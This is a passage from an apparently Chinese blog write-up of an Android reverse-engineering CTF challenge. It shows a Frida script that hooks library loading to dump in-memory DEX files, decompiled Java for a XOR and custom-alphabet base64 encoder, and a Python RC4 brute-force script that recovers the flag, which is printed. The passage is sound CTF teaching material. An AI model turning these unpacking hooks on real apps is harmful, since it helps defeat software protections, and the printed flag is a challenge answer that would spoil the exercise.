!== undefined &amp;&amp; pathptr != null) &#123;                var path = ptr(pathptr).readCString();                //console.log(&quot;dlopen:&quot;, path);                if (path.indexOf(&quot;libart.so&quot;) &gt;= 0) &#123;                    this.can_hook_libart = true;                    console.log(&quot;[dlopen:]&quot;, path);                &#125;            &#125;        &#125;,        onLeave: function(retval) &#123;            if (this.can_hook_libart &amp;&amp; !is_hook_libart) &#123;                dump_dex();                is_hook_libart = true;            &#125;        &#125;    &#125;)    Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;), &#123;        onEnter: function(args) &#123;            var pathptr = args[0];            if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                var path = ptr(pathptr).readCString();                //console.log(&quot;android_dlopen_ext:&quot;, path);                if (path.indexOf(&quot;libart.so&quot;) &gt;= 0) &#123;                    this.can_hook_libart = true;                    console.log(&quot;[android_dlopen_ext:]&quot;, path);                &#125;            &#125;        &#125;,        onLeave: function(retval) &#123;            if (this.can_hook_libart &amp;&amp; !is_hook_libart) &#123;                dump_dex();                is_hook_libart = true;            &#125;        &#125;    &#125;);&#125;setImmediate(dump_dex);</code></pre><p>运行脚本之后，多点几次图片运行app，dump下来了很多dex，但是可以发现，前几个就是app中的那几个dex，后面的就应该都是一样的了，也就是对key进行加密的逻辑，先进行异或，然后进行换表的base64编码‘</p><pre><code class="language-java">package com.nobody;/* loaded from: C:\Users\16219\Desktop\dump_dex_com.nobody.zunjia\class85.dex */public class zundujiadu &#123;    private static final String CUSTOM_ALPHABET = &quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;;    private static final int[] DECODE_TABLE = new int[128];    public zundujiadu() &#123;        for (int i = 0; i &lt; DECODE_TABLE.length; i++) &#123;            DECODE_TABLE[i] = -1;        &#125;        for (int i2 = 0; i2 &lt; CUSTOM_ALPHABET.length(); i2++) &#123;            DECODE_TABLE[CUSTOM_ALPHABET.charAt(i2)] = i2;        &#125;    &#125;    public String encode(String str) &#123;        int i;        byte b;        byte b2;        if (str == null) &#123;            return null;        &#125;        byte[] bytes = str.getBytes();        int length = bytes.length;        for (int i2 = 0; i2 &lt; length; i2++) &#123;            bytes[i2] = (byte) (bytes[i2] ^ i2);        &#125;        byte[] bArr = new byte[((length + 2) / 3) * 4];        int i3 = 0;        int i4 = 0;        while (i3 &lt; length) &#123;            int i5 = i3 + 1;            byte b3 = bytes[i3];            if (i5 &lt; length) &#123;                i = i5 + 1;                b = bytes[i5];            &#125; else &#123;                i = i5;                b = 0;            &#125;            if (i &lt; length) &#123;                b2 = bytes[i];                i++;            &#125; else &#123;                b2 = 0;            &#125;            int i6 = ((b3 &amp; 255) &lt;&lt; 16) | ((b &amp; 255) &lt;&lt; 8) | (b2 &amp; 255);            int i7 = i4 + 1;            bArr[i4] = (byte) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; 18) &amp; 63);            int i8 = i7 + 1;            bArr[i7] = (byte) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; 12) &amp; 63);            int i9 = i8 + 1;            bArr[i8] = (byte) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; 6) &amp; 63);            i4 = i9 + 1;            bArr[i9] = (byte) CUSTOM_ALPHABET.charAt(i6 &amp; 63);            i3 = i;        &#125;        return new String(bArr);    &#125;    public String encode(byte[] bArr) &#123;        int i;        byte b;        byte b2;        if (bArr == null) &#123;            return null;        &#125;        int length = bArr.length;        for (int i2 = 0; i2 &lt; length; i2++) &#123;            bArr[i2] = (byte) (bArr[i2] ^ i2);        &#125;        byte[] bArr2 = new byte[((length + 2) / 3) * 4];        int i3 = 0;        int i4 = 0;        while (i3 &lt; length) &#123;            int i5 = i3 + 1;            byte b3 = bArr[i3];            if (i5 &lt; length) &#123;                i = i5 + 1;                b = bArr[i5];            &#125; else &#123;                i = i5;                b = 0;            &#125;            if (i &lt; length) &#123;                b2 = bArr[i];                i++;            &#125; else &#123;                b2 = 0;            &#125;            int i6 = ((b3 &amp; 255) &lt;&lt; 16) | ((b &amp; 255) &lt;&lt; 8) | (b2 &amp; 255);            int i7 = i4 + 1;            bArr2[i4] = (byte) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; 18) &amp; 63);            int i8 = i7 + 1;            bArr2[i7] = (byte) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; 12) &amp; 63);            int i9 = i8 + 1;            bArr2[i8] = (byte) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; 6) &amp; 63);            i4 = i9 + 1;            bArr2[i9] = (byte) CUSTOM_ALPHABET.charAt(i6 &amp; 63);            i3 = i;        &#125;        return new String(bArr2);    &#125;    public String decode(String str) &#123;        if (str == null) &#123;            return null;        &#125;        String replace = str.replace(&quot;=&quot;, &quot;&quot;);        int length = replace.length();        if (length % 4 != 0) &#123;            throw new IllegalArgumentException(&quot;输入的 Base64 字符串长度不是 4 的倍数&quot;);        &#125;        int i = (length * 3) / 4;        byte[] bArr = new byte[i];        int i2 = 0;        int i3 = 0;        while (i2 &lt; length) &#123;            int i4 = 0;            int i5 = 0;            while (i4 &lt; 4) &#123;                int i6 = i2 + 1;                char charAt = replace.charAt(i2);                if (charAt &lt; 0 || charAt &gt;= DECODE_TABLE.length || DECODE_TABLE[charAt] == -1) &#123;                    throw new IllegalArgumentException(&quot;输入的 Base64 字符串包含非法字符: &quot; + charAt);                &#125;                i5 |= DECODE_TABLE[charAt] &lt;&lt; ((3 - i4) * 6);                i4++;                i2 = i6;            &#125;            int i7 = i3 + 1;            bArr[i3] = (byte) ((i5 &gt;&gt; 16) &amp; 255);            if (i7 &lt; i) &#123;                bArr[i7] = (byte) ((i5 &gt;&gt; 8) &amp; 255);                i7++;            &#125;            if (i7 &gt;= i) &#123;                i3 = i7;            &#125; else &#123;                i3 = i7 + 1;                bArr[i7] = (byte) (i5 &amp; 255);            &#125;        &#125;        for (int i8 = 0; i8 &lt; i3; i8++) &#123;            bArr[i8] = (byte) (bArr[i8] ^ i8);        &#125;        return new String(bArr, 0, i3);    &#125;&#125;</code></pre><p>然后就是so层的rc4</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250205190817166.png" alt="image-20250205190817166"></p><p>那么接下来就是爆破，0.o和o.0的组合，利用递归调用来爆破</p><pre><code class="language-python">from Crypto.Cipher import ARC4import base64import threading# 待解密的数据data = [0x7A, 0xC7, 0xC7, 0x94, 0x51, 0x82, 0xF5, 0x99, 0x0C, 0x30,        0xC8, 0xCD, 0x97, 0xFE, 0x3D, 0xD2, 0xAE, 0x0E, 0xBA, 0x83,        0x59, 0x87, 0xBB, 0xC6, 0x35, 0xE1, 0x8C, 0x59, 0xEF, 0xAD,        0xFA, 0x94, 0x74, 0xD3, 0x42, 0x27, 0x98, 0x77, 0x54, 0x3B,        0x46, 0x5E, 0x95]# 自定义字符集映射def get_key(key):    string1 = &quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;    string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;    old_key = [ord(i) for i in key]    for i in range(len(key)):        old_key[i] ^= i    res = bytes(old_key)    return base64.b64encode(res).decode().translate(str.maketrans(string2, string1))# RC4解密def rc4(key):    cipher = ARC4.new(key.encode())    return cipher.decrypt(bytes(data))# 优化的递归方法，使用缓存避免重复计算def boom(str, cache):    if len(str) == 36:        return    # 查找缓存    if str in cache:        return    cache.add(str)  # 将当前字符串加入缓存    res_o0 = get_key(str + &quot;o.0&quot;)    flag_o0 = rc4(res_o0)    if b&quot;hgame&#123;&quot; in flag_o0 and b&quot;&#125;&quot; in flag_o0:        print(flag_o0.decode())        print(str + &quot;o.0&quot;)    res_0o = get_key(str + &quot;0.o&quot;)    flag_0o = rc4(res_0o)    if b&quot;hgame&#123;&quot; in flag_0o and b&quot;&#125;&quot; in flag_0o:        print(flag_0o.decode())        print(str + &quot;0.o&quot;)    # 递归调用    boom(str + &quot;o.0&quot;, cache)    boom(str + &quot;0.o&quot;, cache)# 使用线程池加速处理def start_multithreaded_search():    cache = set()  # 用集合做缓存，避免重复处理相同的字符串    threads = []    # 通过多线程加速递归过程    for i in range(5):  # 创建多个线程进行并行处理        t = threading.Thread(target=boom, args=(&quot;&quot;, cache))        threads.append(t)        t.start()    # 等待所有线程执行完毕    for t in threads:        t.join()# 主函数if __name__ == &quot;__main__&quot;:    start_multithreaded_search()</code></pre><p>hgame{4af153b9-ed3e-420b-978c-eeff72318b49}<br>o.00.oo.00.oo.0o.00.o0.o0.o0.o0.o</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
